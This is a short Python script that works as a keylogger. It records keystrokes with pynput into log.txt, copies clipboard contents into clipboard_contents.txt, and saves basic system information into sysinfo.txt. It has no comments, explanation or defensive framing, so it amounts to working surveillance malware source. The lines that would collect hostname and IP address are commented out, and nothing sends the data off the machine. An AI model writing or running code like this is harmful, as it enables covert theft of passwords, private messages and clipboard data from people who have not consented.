import platform

import pynput
from pynput.keyboard import Key, Listener
import win32clipboard
import socket

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(str(k))


def on_release(key):
    if key == Key.esc:
        return False

def copy_clipboard():
    with open("clipboard_contents.txt", "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: " + pasted_data)
        except:
            f.write("Clipboard failed to copy anything")


copy_clipboard()


def system_info():
    with open("sysinfo.txt", "a") as f:
        # hostname = socket.gethostbyname()
        # IP_Address = socket.gethostbyname(hostname)

        f.write("Processor: " +(platform.processor() + "\n"))
        f.write("System: " +(platform.system() + "\n"))
        f.write("Machine: " +(platform.machine() + "\n"))
        # f.write("Hostname: " + hostname + "\n")
        # f.write("IP Address: " + IP_Address + "\n")


system_info()


with Listener(on_press=on_press, on_release= on_release) as listener:
    listener.join()
